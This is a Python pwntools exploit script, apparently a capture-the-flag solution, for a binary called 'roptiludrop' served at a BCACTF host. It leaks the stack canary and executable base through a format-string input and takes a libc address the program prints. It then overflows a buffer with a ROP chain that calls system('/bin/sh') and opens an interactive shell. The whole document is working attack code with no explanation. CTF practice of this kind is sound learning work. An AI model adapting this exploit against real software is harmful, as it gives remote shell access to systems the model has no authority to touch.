#!/usr/bin/python3

from pwn import *

exe = ELF('roptiludrop_patched', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b*life+187
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.bcactf.com', 30344)
else:
        p = process(exe.path)

GDB()
sla(b"> ", b"%9$p%11$p")
canary = int(p.recv(18), 16)
info("canary: " + hex(canary))
exe_leak = int(p.recv(14), 16)
info("exe leak: " + hex(exe_leak))
exe.address = exe_leak - 0x1332
info("exe base: " + hex(exe.address))

p.recvuntil(b"this? ")
libc_leak = int(p.recv(16), 16)
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x64e10
info("libc base: " + hex(libc.address))
rdi = exe.address + 0x00000000000013b3
ret = exe.address + 0x000000000000101a
payload = b"a"*24 + flat(
    canary, 0x0,
    ret, 
    rdi, next(libc.search(b"/bin/sh")),
    libc.sym['system']
)
payload = payload.ljust(0x50, b"\0")
sa(b"> ", payload)
p.interactive()
